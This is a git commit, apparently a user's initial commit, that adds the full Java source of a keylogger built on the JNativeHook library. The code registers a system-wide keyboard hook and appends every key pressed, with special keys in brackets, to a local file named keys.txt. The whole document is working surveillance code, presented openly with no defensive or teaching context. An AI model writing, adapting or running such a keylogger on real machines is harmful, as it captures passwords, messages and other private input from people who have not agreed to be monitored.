a19710091a5f98dc2462804a576b77b821cd446b
Rishabhpatel803 <rockrishabh456@gmail.com>
2020-08-27 11:15:29 +0530

    Initial commit

---
+++ src/keylogger.java
@@ -0,0 +1,70 @@
+import org.jnativehook.GlobalScreen;
+import org.jnativehook.NativeHookException;
+import org.jnativehook.keyboard.NativeKeyEvent;
+import org.jnativehook.keyboard.NativeKeyListener;
+import org.slf4j.Logger;
+import org.slf4j.LoggerFactory;
+
+import java.io.IOException;
+import java.io.OutputStream;
+import java.io.PrintWriter;
+import java.nio.file.Files;
+import java.nio.file.Path;
+import java.nio.file.Paths;
+import java.nio.file.StandardOpenOption;
+import java.util.logging.Level;
+
+/**
+ * @author Rishabhpatel803
+ */
+public class keylogger implements NativeKeyListener {
+
+    private static final Path file = Paths.get("keys.txt");
+    private static final Logger logger = LoggerFactory.getLogger(keylogger.class);
+
+    public static void main(String[] args) {
+
+        logger.info("Key logger has been started");
+
+        init();
+
+        try {
+            GlobalScreen.registerNativeHook();
+        } catch (NativeHookException e) {
+            logger.error(e.getMessage(), e);
+            System.exit(-1);
+        }
+
+        GlobalScreen.addNativeKeyListener(new keylogger());
+    }
+
+    private static void init() {
+        java.util.logging.Logger logger = java.util.logging.Logger.getLogger(GlobalScreen.class.getPackage().getName());
+        logger.setLevel(Level.WARNING);
+        logger.setUseParentHandlers(false);
+    }
+
+    public void nativeKeyPressed(NativeKeyEvent e) {
+        String keyText = NativeKeyEvent.getKeyText(e.getKeyCode());
+
+        try (OutputStream os = Files.newOutputStream(file, StandardOpenOption.CREATE, StandardOpenOption.WRITE,
+                StandardOpenOption.APPEND); PrintWriter writer = new PrintWriter(os)) {
+
+            if (keyText.length() > 1) {
+                writer.print("[" + keyText + "]");
+            } else {
+                writer.print(keyText);
+            }
+
+        } catch (IOException ex) {
+            logger.error(ex.getMessage(), ex);
+            System.exit(-1);
+        }
+    }
+
+    public void nativeKeyReleased(NativeKeyEvent e) {
+    }
+
+    public void nativeKeyTyped(NativeKeyEvent e) {
+    }
+}
